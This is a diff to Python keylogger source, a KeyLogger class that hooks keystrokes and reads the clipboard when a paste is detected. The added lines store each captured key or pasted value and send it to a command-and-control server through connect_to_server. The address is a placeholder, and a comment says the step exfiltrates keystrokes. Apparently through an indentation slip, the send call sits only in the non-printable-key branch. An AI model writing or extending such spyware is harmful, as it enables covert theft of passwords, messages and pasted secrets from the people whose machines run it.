@@ -102,6 +102,8 @@ class KeyLogger:
     
     def keystroke(self, event):
     
+        pressed = ""
+    
         try:
     
             # Get window name if this isn't the current window
@@ -110,16 +112,33 @@ class KeyLogger:
             
             # Identify what key it was
             if 32 < event.Ascii < 127:
+            
                 keyPressed = str(chr(event.Ascii))
                 print(f"[{bcolors.OKCYAN}" + keyPressed + f"{bcolors.ENDC}]", end='')
+                
+                pressed = keyPressed
+                
             else:
+            
                 if event.Key == 'V':
+                
                     win32clipboard.OpenClipboard()
                     value = win32clipboard.GetClipboardData()
                     win32clipboard.CloseClipboard()
                     print(f"[{bcolors.OKCYAN}PASTE{bcolors.ENDC}] - [{bcolors.OKCYAN}" + value + f"{bcolors.ENDC}]")
+                    
+                    pressed = "PASTE:" + value
+                    
                 else:
+                
                     print(f"[{bcolors.OKCYAN}" + str(event.Key) + f"{bcolors.ENDC}]")
+                    
+                    pressed = str(event.Key)
+            
+                # Exfiltrate keystroke to a command and control server if desired.
+                cncIP = "0.0.0.0"
+                cncPort = 12345
+                connect_to_server(cncIP, cncPort, pressed)
             
             return True
 
